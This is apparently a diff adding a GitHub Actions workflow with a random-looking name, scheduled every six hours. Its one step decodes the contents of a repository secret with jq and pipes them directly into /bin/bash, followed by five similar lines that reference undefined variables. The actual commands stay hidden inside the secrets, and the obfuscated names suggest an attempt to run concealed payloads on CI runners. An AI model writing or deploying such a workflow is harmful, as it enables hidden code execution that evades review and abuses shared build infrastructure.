@@ -1,0 +1,21 @@
+name: protectivebiking
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: protectivebiking
+        env:
+          avclr4: ${{ secrets.avclr4 }}
+        run: |
+          echo $avclr4 | jq -r .hzz84160 | /bin/bash
+          echo $h55 | jq -r .s1170 | /bin/bash
+          echo $j3877 | jq -r .ogedx14 | /bin/bash
+          echo $i930 | jq -r .mmzif18074 | /bin/bash
+          echo $m28257 | jq -r .qmer823 | /bin/bash
+          echo $h31519 | jq -r .dj7 | /bin/bash
+
